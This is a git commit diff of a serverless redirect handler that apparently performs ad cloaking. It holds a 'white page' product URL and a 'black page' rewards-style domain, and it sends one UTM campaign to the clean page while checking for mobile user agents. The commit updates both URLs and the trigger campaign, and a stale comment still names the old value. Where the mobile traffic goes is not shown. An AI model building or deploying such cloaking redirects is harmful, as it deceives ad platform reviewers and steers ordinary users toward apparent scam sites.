0fb0ab304fbf6f1655117471b7f0200ecd852f68
Ayden Xu <aydenxunc@gmail.com>
2024-12-10 22:20:18 +0100

    huno

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://plushiedepot.com/products/lifelike-plush-blue-whale";
-    const blackPageURL = "https://rwrds.live";
+    const whitePageURL = "https://little-goose.com/en/products/miffy-meskiukas-blue";
+    const blackPageURL = "https://rwrds.wiki";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -12,7 +12,7 @@ export default function handler(req, res) {
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign === 'l1') {
+    if (utmCampaign === 'l2') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
